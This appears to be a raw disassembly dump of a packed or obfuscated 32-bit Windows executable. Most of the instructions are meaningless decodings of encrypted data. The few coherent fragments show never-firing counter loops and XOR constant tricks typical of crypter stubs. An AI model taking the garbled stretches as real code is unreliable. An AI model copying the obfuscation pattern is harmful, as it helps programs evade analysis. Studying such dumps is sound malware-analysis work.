  4028e5:	mov    dh,BYTE PTR [ebp+0x45d967]
  4028eb:	not    BYTE PTR [ecx-0x3]
  4028ee:	mov    dh,0x5a
  4028f0:	adc    al,0x23
  4028f2:	dec    esp
  4028f3:	inc    ebx
  4028f4:	sahf   
  4028f5:	rcr    DWORD PTR [edx+0x46c91cd8],0x50
  4028fc:	int    0xf0
  4028fe:	pop    ss
  4028ff:	cld    
  402900:	ss sbb eax,0x5ba839b5
  402906:	mov    ecx,ds
  402908:	call   0x515b691b
  40290d:	jp     0x4028b7
  40290f:	pop    esi
  402910:	fadd   DWORD PTR [ebp-0x7dea2abd]
  402916:	jp     0x402941
  402918:	and    cl,BYTE PTR [ebx+ebp*1-0x210e2d3b]
  40291f:	push   0x3e087e94
  402924:	shl    DWORD PTR [ebp+0xba079af],cl
  40292a:	add    ecx,DWORD PTR [edx+eax*2]
  40292d:	outs   dx,BYTE PTR ds:[esi]
  40292e:	xlat   BYTE PTR ds:[ebx]
  40292f:	inc    ecx
  402930:	mov    ds:0xe99a7af0,al
  402935:	jns    0x402991
  402937:	ins    BYTE PTR es:[edi],dx
  402938:	out    0x8f,eax
  40293a:	mov    edx,0x266ce25
  40293f:	stos   DWORD PTR es:[edi],eax
  402940:	mov    ds:0x25d29101,eax
  402945:	and    eax,0xd96639f
  40294a:	mov    ecx,0xc25ca5d4
  40294f:	jle    0x4029c7
  402951:	inc    eax
  402952:	sbb    BYTE PTR [ebp-0x559bd883],cl
  402958:	inc    eax
  402959:	lods   eax,DWORD PTR ds:[esi]
  40295a:	push   edi
  40295b:	cli    
  40295c:	lods   eax,DWORD PTR ds:[esi]
  40295d:	enter  0xf,0xc1
  402961:	adc    BYTE PTR [edx],dh
  402963:	pop    ss
  402964:	test   al,0x4b
  402966:	loope  0x4029c6
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0xa0385483
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x2e70707e
  402afd:	mov    ch,0x27
  402aff:	mov    al,0x8e
  402b01:	rcl    DWORD PTR [edi+0x79],1
  402b04:	push   edi
  402b05:	pusha  
  402b06:	adc    eax,0x6f75fc35
  402b0b:	sbb    eax,0x114eec80
  402b10:	mov    edi,0x156e68a0
  402b15:	add    al,0x98
  402b17:	cmp    dh,BYTE PTR [edx+0x413535a2]
  402b1d:	push   0xffffff9f
  402b1f:	xor    bh,BYTE PTR [eax+eax*1-0x6c76cce4]
  402b26:	das    
  402b27:	icebp  
  402b28:	stos   BYTE PTR es:[edi],al
  402b29:	pop    esp
  402b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b2b:	aaa    
  402b2c:	stos   BYTE PTR es:[edi],al
  402b2d:	pop    ss
  402b2e:	mov    edi,0x60bd3540
  402b33:	sbb    DWORD PTR [edi-0x52],0xd0751101
  402b3a:	xchg   BYTE PTR [ecx-0x30],ah
  402b3d:	xchg   ecx,eax
  402b3e:	mov    BYTE PTR [esi+0x19],dh
  402b41:	dec    esp
  402b42:	or     al,0x25
  402b44:	aam    0x6c
  402b46:	fsubp  st(2),st
  402b48:	mov    BYTE PTR [esp+edi*8-0x3f47141c],ch
  402b4f:	retf   0x4d5b
  402b52:	(bad)  
  402b53:	adc    esp,edi
  402b55:	out    dx,eax
  402b56:	data16 fidiv WORD PTR [eax]
  402b59:	lods   al,BYTE PTR ds:[esi]
  402b5a:	ins    BYTE PTR es:[edi],dx
  402b5b:	cmp    BYTE PTR [edx+0xc032716],dl
  402b61:	int3   
  402b62:	shl    BYTE PTR [edi],0xda
  402b65:	mov    edx,?
  402b67:	pshufw mm7,QWORD PTR [edx],0x60
  402b6b:	and    esi,ebx
  402b6d:	sbb    eax,0x187a48c7
  402b72:	(bad)  
  402b73:	jp     0x402b78
  402b75:	or     DWORD PTR ds:0x4f4b89c2,0x84946d82
  402b7f:	jp     0x402b8f
  402b81:	lahf   
  402b82:	and    ch,ah
  402b84:	clc    
  402b85:	test   cl,dl
  402b87:	or     BYTE PTR [edx+eax*1],ah
  402b8a:	aad    0x99
  402b8c:	ins    DWORD PTR es:[edi],dx
  402b8d:	sbb    esi,DWORD PTR [edi+ebp*1-0x9fa4a99]
  402b94:	jno    0x402bed
  402b96:	sar    WORD PTR [esi+0x1d92baac],cl
  402b9d:	repz shl BYTE PTR [esi-0x2a2bad1f],cl
  402ba4:	std    
  402ba5:	shl    BYTE PTR gs:[ebp+0x5b63257e],cl
  402bac:	dec    ebx
  402bad:	out    0xcd,eax
  402baf:	je     0x402bf8
  402bb1:	out    dx,al
  402bb2:	xchg   DWORD PTR [eax-0x56],edx
  402bb5:	scas   eax,DWORD PTR es:[edi]
  402bb6:	leave  
  402bb7:	jge    0x402b9f
  402bb9:	add    BYTE PTR [ebx+ebx*2-0x10],0x4c
  402bbe:	adc    cl,BYTE PTR [esi]
  402bc0:	rcl    BYTE PTR [edx-0x7eebaaf6],1
  402bc6:	test   BYTE PTR [ebx-0x5043823f],ch
  402bcc:	enter  0xd30b,0xb9
  402bd0:	dec    ebx
  402bd1:	sub    dh,BYTE PTR fs:[eax+0x3a42208d]
  402bd8:	outs   dx,DWORD PTR ds:[esi]
  402bd9:	out    dx,eax
  402bda:	xchg   DWORD PTR [ebx],esp
  402bdc:	add    eax,0xb25c1f4c
  402be1:	xchg   ebp,ebx
  402be3:	(bad)  
  402be5:	mov    ebp,0x166b12dd
  402bea:	adc    al,0xdb
  402bec:	push   es
  402bed:	mov    ebx,0xa7e90577
  402bf2:	inc    ebx
  402bf3:	pusha  
  402bf4:	ja     0x402c26
  402bf6:	mov    al,ds:0xbafc1e52
  402bfb:	clc    
  402bfc:	push   edi
  402bfd:	or     BYTE PTR [ebx+0x7a0070d6],ah
  402c03:	jge    0x402bbf
  402c05:	clc    
  402c06:	push   0x12
  402c08:	cdq    
  402c09:	and    bl,BYTE PTR [ecx+eiz*1]
  402c0c:	outs   dx,BYTE PTR ds:[esi]
  402c0d:	add    bl,BYTE PTR [ecx]
  402c0f:	mov    es,edi
  402c11:	sub    edi,DWORD PTR [ebp+edx*2-0x62f16b3e]
  402c18:	repnz xchg edx,eax
  402c1a:	push   ebx
  402c1b:	mov    ecx,esp
  402c1d:	mov    dh,0xf6
  402c1f:	ret    
  402c20:	inc    eax
  402c21:	inc    eax
  402c22:	jbe    0x402c6f
  402c24:	cmp    DWORD PTR [ebx*4-0x53a33fd5],ebx
  402c2b:	pop    ecx
  402c2c:	add    al,0xce
  402c2e:	scas   eax,DWORD PTR es:[edi]
  402c2f:	fxch   st(5)
  402c31:	inc    edi
  402c32:	dec    ebx
  402c33:	sub    dh,ch
  402c35:	loope  0x402c02
  402c37:	mov    bl,0x4f
  402c39:	fwait
  402c3a:	jo     0x402cb7
  402c3c:	cmp    DWORD PTR [edi],0x612b80e1
  402c42:	xchg   ecx,eax
  402c43:	adc    bl,BYTE PTR [ebx]
  402c45:	test   DWORD PTR [ebx+0x23],ebp
  402c48:	or     al,0x77
  402c4a:	xor    al,0xe1
  402c4c:	out    0x66,al
  402c4e:	push   ss
  402c4f:	loop   0x402bd7
  402c51:	js     0x402c32
  402c53:	jns    0x402c56
  402c55:	sub    ebp,ebx
  402c57:	jbe    0x402c5e
  402c59:	or     eax,0xbb49f653
  402c5e:	test   bl,dl
  402c60:	add    BYTE PTR [ebp-0x3fa8dd1],cl
  402c66:	test   DWORD PTR [edx],edi
  402c68:	enter  0xca60,0x59
  402c6c:	jmp    0x6f6b56aa
  402c71:	jno    0x402c28
  402c73:	test   al,0x82
  402c75:	dec    esp
  402c76:	cmp    DWORD PTR [ecx-0x31463963],edx
  402c7c:	xor    BYTE PTR [ebx],0x91
  402c7f:	or     al,0x89
  402c81:	aam    0x61
  402c83:	add    DWORD PTR [ebx],0x3058f39b
  402c89:	aaa    
  402c8a:	js     0x402c53
  402c8c:	aaa    
  402c8d:	xchg   ecx,eax
  402c8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c8f:	mov    eax,ds:0x17a4e316
  402c94:	pop    ds
  402c95:	test   DWORD PTR [edi+0x56],edi
  402c98:	inc    eax
  402c99:	xlat   BYTE PTR ds:[ebx]
  402c9a:	jbe    0x402cde
  402c9c:	clc    
  402c9d:	in     eax,dx
  402c9e:	add    BYTE PTR [ecx+ebp*1+0x4],dh
  402ca2:	dec    esi
  402ca3:	out    dx,eax
  402ca4:	mov    edi,0x63f54323
  402ca9:	pop    edx
  402caa:	mov    al,0x43
  402cac:	add    al,0x44
  402cae:	sub    BYTE PTR [eax-0x41],dh
  402cb1:	dec    esi
  402cb2:	mov    eax,0x8353d5e3
  402cb7:	or     bl,BYTE PTR [ebx]
  402cb9:	out    dx,al
  402cba:	out    0xc2,al
  402cbc:	or     al,0x4d
  402cbe:	popa   
  402cbf:	hlt    
  402cc0:	jbe    0x402d13
  402cc2:	loopne 0x402c7a
  402cc4:	dec    eax
  402cc5:	fmul   DWORD PTR ds:0x2a7ac7c6
  402ccb:	shl    DWORD PTR [esi+0xdabb50c],cl
  402cd1:	and    DWORD PTR [edx+0x27],esi
  402cd4:	xchg   ebx,eax
  402cd5:	mov    dh,0x83
  402cd7:	adc    esp,esi
  402cd9:	push   ds
  402cda:	mov    al,0xe1
  402cdc:	mov    edi,0xa30fd9e2
  402ce1:	cmc    
  402ce2:	adc    BYTE PTR [edi+0x67f93dd4],dl
  402ce8:	jg     0x402c97
  402cea:	xchg   edx,eax
  402ceb:	das    
  402cec:	and    al,0x33
  402cee:	in     eax,0x88
  402cf0:	jae    0x402c87
  402cf2:	das    
  402cf3:	adc    BYTE PTR [ecx-0x50],dl
  402cf6:	(bad)  
  402cf7:	xor    BYTE PTR [edx-0x54],bl
  402cfa:	fild   WORD PTR [eax-0x7cc02ffd]
  402d00:	xlat   BYTE PTR ds:[ebx]
  402d01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d02:	fld    DWORD PTR [ecx-0x65969376]
  402d08:	in     eax,dx
  402d09:	mov    DWORD PTR [edi+ebp*8],eax
  402d0c:	or     ebp,0xffffffd1
  402d0f:	enter  0xe60d,0xd6
  402d13:	sbb    ebp,DWORD PTR [ecx-0x36]
  402d16:	sub    al,0xfd
  402d18:	jo     0x402d42
  402d1a:	cmp    al,0x35
  402d1c:	retf   0x34d3
  402d1f:	lahf   
  402d20:	mov    ecx,0x60613dd9
  402d25:	out    0x25,eax
  402d27:	sbb    al,0x83
  402d29:	jp     0x402d90
  402d2b:	jge    0x402d5d
  402d2d:	xchg   ebx,eax
  402d2e:	xor    eax,0xf6ccbb64
  402d33:	imul   ecx,DWORD PTR fs:[eax-0x4c101869],0xa89cc1f9
  402d3e:	imul   eax,DWORD PTR ds:0xf8dd45f8,0xf54c1470
  402d48:	fst    QWORD PTR [edi]
  402d4a:	icebp  
  402d4b:	add    al,0x86
  402d4d:	xchg   edx,eax
  402d4e:	ret    
  402d4f:	retf   0xbc7e
  402d52:	mov    DWORD PTR [ebp+edi*1+0x6f7dd58],ecx
  402d59:	iret   
  402d5a:	icebp  
  402d5b:	add    DWORD PTR [eax],0x2659e71f
  402d61:	out    0x8,al
  402d63:	push   ebx
  402d64:	clc    
  402d65:	push   esp
  402d66:	stos   DWORD PTR es:[edi],eax
  402d67:	out    0xeb,al
  402d69:	in     eax,dx
  402d6a:	xor    ebp,edx
  402d6c:	jbe    0x402da6
  402d6e:	popa   
  402d6f:	mov    ah,0xfc
  402d71:	sub    eax,0xd413fdfb
  402d76:	mov    edx,0xebd3c3a5
  402d7b:	dec    esp
  402d7c:	pushf  
  402d7d:	push   esp
  402d7e:	mov    ecx,0xb7801416
  402d83:	pop    ebx
  402d84:	cli    
  402d85:	mov    esp,0xe43fb236
  402d8a:	fs mov bh,0x3b
  402d8d:	jl     0x402d50
  402d8f:	fidiv  WORD PTR [eax]
  402d91:	xchg   DWORD PTR ds:0xf32faa7a,ebp
  402d97:	loope  0x402d4b
  402d99:	(bad)  
  402d9a:	xchg   edx,eax
  402d9b:	scas   al,BYTE PTR es:[edi]
  402d9c:	lods   al,BYTE PTR ds:[esi]
  402d9d:	(bad)  
  402d9e:	xchg   esp,eax
  402d9f:	call   0x8e353dc2
  402da4:	in     eax,dx
  402da5:	jmp    0x3621b092
  402daa:	and    al,0x23
  402dac:	int    0x54
  402dae:	or     DWORD PTR [eax+eax*1],esp
  402db1:	imul   edx,DWORD PTR [esi-0x76],0x52381a24
  402db8:	sub    BYTE PTR [ebp+0x42],0x8a
  402dbc:	and    BYTE PTR [ebx+0x3],dl
  402dbf:	(bad)  
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	cmp    BYTE PTR [eax+0xabe4698],al
  402de5:	jo     0x402e57
  402de7:	mov    esi,0x7c70707e
  402dec:	jmp    0x61e020e4
  402df1:	dec    ebp
  402df2:	mov    ds:0x2c77335b,eax
  402df7:	es xchg esp,eax
  402df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dfa:	lods   eax,DWORD PTR ds:[esi]
  402dfb:	(bad)  
  402dfc:	sbb    al,0x95
  402dfe:	(bad)  
  402e00:	stos   DWORD PTR es:[edi],eax
  402e01:	in     eax,0x9c
  402e03:	or     al,0x1e
  402e05:	mov    dl,0xc6
  402e07:	jns    0x402e36
  402e09:	aam    0x5e
  402e0b:	clc    
  402e0c:	jl     0x402e4f
  402e0e:	or     ch,ch
  402e10:	push   esp
  402e11:	cli    
  402e12:	loopne 0x402da0
  402e14:	fiadd  DWORD PTR [edi-0x3a06be83]
  402e1a:	into   
  402e1b:	and    DWORD PTR [ebp-0x716a317f],edi
  402e21:	pop    eax
  402e22:	clc    
  402e23:	lock xor BYTE PTR [ecx+0x347bff5c],dl
  402e2a:	dec    edx
  402e2b:	mov    ch,0xd1
  402e2d:	sub    al,0xb1
  402e2f:	jmp    0x1544:0xcfeb955a
  402e36:	or     eax,0xde62a85e
  402e3b:	nop
  402e3c:	jmp    0xea7daf0d
  402e41:	sahf   
  402e42:	aas    
  402e43:	jne    0x402e1b
  402e45:	fcomp  QWORD PTR [ecx-0x769424a4]
  402e4b:	jp     0x402ec3
  402e4d:	ror    BYTE PTR [edx+0x30],1
  402e50:	mov    dh,0xcf
  402e52:	mov    bh,BYTE PTR [ebp-0x3]
  402e55:	mov    ds:0xef4bd02a,al
  402e5a:	fist   WORD PTR [edi]
  402e5c:	mov    esp,0xeaa953c5
  402e61:	mov    ah,0x58
  402e63:	xchg   ecx,eax
  402e64:	and    BYTE PTR [edx+0x72],ah
  402e67:	xchg   ecx,eax
  402e68:	fstp   DWORD PTR [esi]
  402e6a:	cmp    eax,0xb081873a
  402e6f:	cs aad 0xd4
  402e72:	imul   ebp,DWORD PTR [esi+eiz*8],0xfffffffc
  402e76:	mov    ebp,0xa84efb9d
  402e7b:	xor    BYTE PTR [esp+edx*1],0x4f
  402e7f:	rol    ah,cl
  402e81:	std    
  402e82:	mov    ds:0xc2fe3dcc,al
  402e87:	dec    esp
  402e88:	mov    WORD PTR [esi+0x23],ds
  402e8b:	(bad)  
  402e8c:	mov    bl,0xb8
  402e8e:	rol    BYTE PTR [ebp+0x6b],1
  402e91:	mov    dl,0x1
  402e93:	mov    esi,0xb8d6864d
  402e98:	outs   dx,BYTE PTR ds:[esi]
  402e99:	jp     0x402eb9
  402e9b:	push   eax
  402e9c:	popa   
  402e9d:	inc    edi
  402e9e:	and    eax,0x24cd376
  402ea3:	(bad)  
  402ea4:	mov    fs,WORD PTR [ecx+edx*1-0x2d]
  402ea8:	idiv   BYTE PTR ds:0x279cfc2f
  402eae:	sbb    al,0xb6
  402eb0:	xor    DWORD PTR [ecx+edx*1+0x65a95c9a],ebp
  402eb7:	or     edi,esp
  402eb9:	call   0x5ad3dac8
  402ebe:	fld    TBYTE PTR [edx+0x7cdd3c2e]
  402ec4:	jnp    0x402e72
  402ec6:	loope  0x402ed1
  402ec8:	addr16 inc ebp
  402eca:	mov    bh,0x7f
  402ecc:	popf   
  402ecd:	aam    0xe3
  402ecf:	leave  
  402ed0:	push   ds
  402ed1:	dec    ebp
  402ed2:	call   0x27fc:0x1a4ef3a2
  402ed9:	popa   
  402eda:	das    
  402edb:	or     al,0x3a
  402edd:	(bad)  
  402edf:	mov    ebx,0xc38787be
  402ee4:	add    BYTE PTR [ecx+0x18],bl
  402ee7:	call   0x2935:0xa51282ce
  402eee:	pop    esi
  402eef:	les    esi,FWORD PTR gs:[ecx]
  402ef2:	dec    ebp
  402ef3:	inc    eax
  402ef4:	adc    eax,esi
  402ef6:	inc    eax
  402ef7:	fidivr WORD PTR [ebx-0x1b96d4cb]
  402efd:	xor    eax,0x45015490
  402f02:	mov    al,0x63
  402f04:	adc    eax,0xc1116545
  402f09:	fisub  WORD PTR [eax+0x2]
  402f0c:	mov    cl,BYTE PTR [eax+0x61]
  402f0f:	fnstcw WORD PTR [eax+0x6b]
  402f12:	int3   
  402f13:	mov    dh,0x82
  402f15:	nop
  402f16:	push   eax
  402f17:	lahf   
  402f18:	push   esp
  402f19:	in     eax,0xc6
  402f1b:	xchg   BYTE PTR [esi-0x77],cl
  402f1e:	mov    BYTE PTR [ecx+0x4f66a322],ch
  402f24:	js     0x402f2e
  402f26:	xchg   BYTE PTR [ecx+0x3551a86b],bl
  402f2c:	jl     0x402ecc
  402f2e:	mov    ebx,0x4c14325
  402f33:	mov    dh,0x15
  402f35:	(bad)  
  402f36:	stos   DWORD PTR es:[edi],eax
  402f37:	lahf   
  402f38:	and    esp,ecx
  402f3a:	icebp  
  402f3b:	lods   eax,DWORD PTR ds:[esi]
  402f3c:	push   ecx
  402f3d:	inc    edi
  402f3e:	test   al,dh
  402f40:	rcr    DWORD PTR [ebx+0x2f68eea1],0xbe
  402f47:	pop    ebp
  402f48:	mov    ecx,0x42fde0ec
  402f4d:	mov    edx,0x165b67e3
  402f52:	push   esp
  402f53:	call   0xc506a111
  402f58:	(bad)  
  402f59:	aas    
  402f5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f5b:	xor    eax,0x4a4519e8
  402f60:	dec    eax
  402f61:	sub    al,0xea
  402f63:	es jae 0x402f9f
  402f66:	adc    BYTE PTR [edx+0x2e40982a],0x5e
  402f6d:	lea    eax,[ecx+0x3]
  402f70:	aaa    
  402f71:	push   0x6f
  402f73:	out    dx,al
  402f74:	test   edx,ebp
  402f76:	add    ecx,ebp
  402f78:	and    BYTE PTR [ebp-0x6c],al
  402f7b:	jp     0x402f6a
  402f7d:	and    edx,ebp
  402f7f:	je     0x402f96
  402f81:	sub    eax,edi
  402f83:	sbb    eax,0x75f086f9
  402f88:	mov    ds:0xce6dbcc8,al
  402f8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f8e:	mov    ds:0x99beeec8,al
  402f93:	inc    ebx
  402f94:	daa    
  402f95:	ffree  st(6)
  402f97:	repnz sub ebx,DWORD PTR [ecx+esi*8+0xa]
  402f9c:	dec    esi
  402f9d:	lock jbe 0x402fb8
  402fa0:	push   ecx
  402fa1:	xchg   DWORD PTR [edx+0x3d],ecx
  402fa4:	ficom  DWORD PTR [esi-0x10c5b984]
  402faa:	dec    ecx
  402fab:	and    BYTE PTR [esi+0x53caf46d],al
  402fb1:	jl     0x402fca
  402fb3:	aas    
  402fb4:	bound  edx,QWORD PTR [edx+eax*8]
  402fb7:	cmp    bl,0xf8
  402fba:	pop    edx
  402fbb:	xchg   edi,eax
  402fbc:	stos   BYTE PTR es:[edi],al
  402fbd:	xchg   edx,eax
  402fbe:	mov    ebx,0xe5844655
  402fc3:	mov    eax,DWORD PTR [ecx]
  402fc5:	mov    edi,0x37d14c56
  402fca:	add    al,0xb2
  402fcc:	adc    eax,0xaf2379a0
  402fd1:	mov    ah,cl
  402fd3:	xor    eax,0x7e85e3b9
  402fd8:	(bad)  
  402fd9:	sbb    DWORD PTR [ebp-0x3e51c3e6],ebx
  402fdf:	and    al,0x65
  402fe1:	mov    ch,0x45
  402fe3:	push   ebp
  402fe4:	mov    dl,0xca
  402fe6:	lock test BYTE PTR [eax+ebp*2],al
  402fea:	in     eax,0x4e
  402fec:	add    BYTE PTR [esi+edx*2],0xba
  402ff0:	aaa    
  402ff1:	loope  0x402fc9
  402ff3:	fs stos DWORD PTR es:[edi],eax
  402ff5:	sub    al,0xd9
  402ff7:	cmp    dh,BYTE PTR [edx]
  402ff9:	push   edi
  402ffa:	jnp    0x40302d
  402ffc:	pop    ecx
  402ffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ffe:	dec    ebp
  402fff:	xchg   edi,eax
  403000:	xor    eax,0x7f672e2f
  403005:	aam    0x54
  403007:	cli    
  403008:	cli    
  403009:	jns    0x40304b
  40300b:	cmc    
  40300c:	mov    edi,0xc21f74f1
  403011:	adc    bh,BYTE PTR [esi-0x41ee5c]
  403017:	cdq    
  403018:	push   esp
  403019:	inc    ebp
  40301a:	cmp    eax,0x4752bd73
  40301f:	ficom  WORD PTR [eax+0x68]
  403022:	adc    eax,0x7983e7a4
  403027:	shl    edx,1
  403029:	fild   WORD PTR [esi+0x3c]
  40302c:	test   al,0xab
  40302e:	xor    dh,dl
  403030:	aad    0x7
  403032:	and    BYTE PTR [edx+edi*1],bh
  403035:	icebp  
  403036:	out    0x6a,al
  403038:	dec    esi
  403039:	jae    0x402fcb
  40303b:	xchg   DWORD PTR [edi],ebp
  40303d:	adc    BYTE PTR [edi-0x46],0xee
  403041:	add    al,0x7c
  403043:	icebp  
  403044:	jp     0x402fd6
  403046:	jns    0x4030b0
  403048:	push   esp
  403049:	and    eax,0x549ec5f7
  40304e:	push   es
  40304f:	push   edi
  403050:	and    DWORD PTR [ecx+0x24a5243c],0x57
  403057:	or     ebp,DWORD PTR cs:[eax]
  40305a:	repnz iret 
  40305c:	xchg   ebp,eax
  40305d:	ffreep st(4)
  40305f:	add    ecx,esp
  403061:	jecxz  0x403003
  403063:	xchg   edi,eax
  403064:	ins    BYTE PTR es:[edi],dx
  403065:	add    eax,0x17aa4d1b
  40306a:	pop    ebp
  40306b:	inc    ebx
  40306c:	jmp    0x40309e
  40306e:	mov    ds:0xbe683b3d,al
  403073:	jnp    0x403082
  403075:	xchg   BYTE PTR [ecx-0x3b],bl
  403078:	mov    esp,0xf27c2a8b
  40307d:	les    ebx,FWORD PTR [edx+0x640b353f]
  403083:	push   esi
  403084:	mov    ch,0xba
  403086:	mov    ecx,0x16d57210
  40308b:	inc    esp
  40308c:	pop    ebx
  40308d:	lods   eax,DWORD PTR ds:[esi]
  40308e:	ins    BYTE PTR es:[edi],dx
  40308f:	xor    al,BYTE PTR [edx+0x61]
  403092:	rol    BYTE PTR [esi-0x2e3bf001],1
  403098:	leave  
  403099:	mov    ah,0xdb
  40309b:	cmp    bl,BYTE PTR [ebp+ebp*8-0x7b27620f]
  4030a2:	or     BYTE PTR [ebx-0x1d],0xfa
  4030a6:	arpl   dx,si
  4030a8:	dec    ebx
  4030a9:	ror    esi,1
  4030ab:	sbb    cl,BYTE PTR [esi+edi*4+0x32729c]
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xf9
  4030ce:	jne    0x403120
  4030d0:	stc    
  4030d1:	cld    
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0x8770707e
  4030da:	push   edx
  4030db:	outs   dx,BYTE PTR ds:[esi]
  4030dc:	stos   BYTE PTR es:[edi],al
  4030dd:	fistp  WORD PTR [eax-0x19e7f293]
  4030e3:	stos   BYTE PTR es:[edi],al
  4030e4:	xor    eax,0x5248cbe
  4030e9:	and    eax,0x2613f8fb
  4030ee:	xor    eax,0x2f4f3a12
  4030f3:	leave  
  4030f4:	in     al,dx
  4030f5:	ins    DWORD PTR es:[edi],dx
  4030f6:	and    al,0xe8
  4030f8:	cs dec ebx
  4030fa:	push   0xf883c7c1
  4030ff:	inc    esi
  403100:	ds cmp eax,0xe9a76d19
  403106:	lods   eax,DWORD PTR ds:[esi]
  403107:	and    al,0x68
  403109:	into   
  40310a:	not    BYTE PTR [bp+si-0x18]
  40310e:	add    ah,BYTE PTR [esi]
  403110:	enter  0x7d81,0x77
  403114:	ja     0x4030f5
  403116:	pop    ecx
  403117:	and    al,BYTE PTR [edi+0x4c]
  40311a:	cmp    BYTE PTR [edi],0xa7
  40311d:	int    0x46
  40311f:	arpl   WORD PTR [ebx+ebp*4-0x7],ax
  403123:	pop    ss
  403124:	mov    al,ds:0x671b64d2
  403129:	cmp    eax,0x690e80e9
  40312e:	sub    eax,0x571be581
  403133:	xchg   ebx,eax
  403134:	inc    edi
  403135:	into   
  403136:	jg     0x40317a
  403138:	sahf   
  403139:	adc    dh,BYTE PTR [edi+ecx*1-0x2a]
  40313d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40313e:	popa   
  40313f:	sbb    ecx,DWORD PTR [ecx]
  403141:	xchg   edi,eax
  403142:	mov    ah,BYTE PTR [esi+0x74]
  403145:	push   0xffffffd3
  403147:	(bad)  
  403148:	imul   ecx,eax,0x7f
  40314b:	mov    ah,0xd
  40314d:	cli    
  40314e:	inc    esp
  40314f:	or     BYTE PTR [esi-0x12550323],cl
  403155:	xchg   BYTE PTR [esi-0x4d],ah
  403158:	push   ss
  403159:	scas   eax,DWORD PTR es:[edi]
  40315a:	xor    BYTE PTR [edi-0x57],dl
  40315d:	stos   BYTE PTR es:[edi],al
  40315e:	mov    ds:0x517bb1b7,al
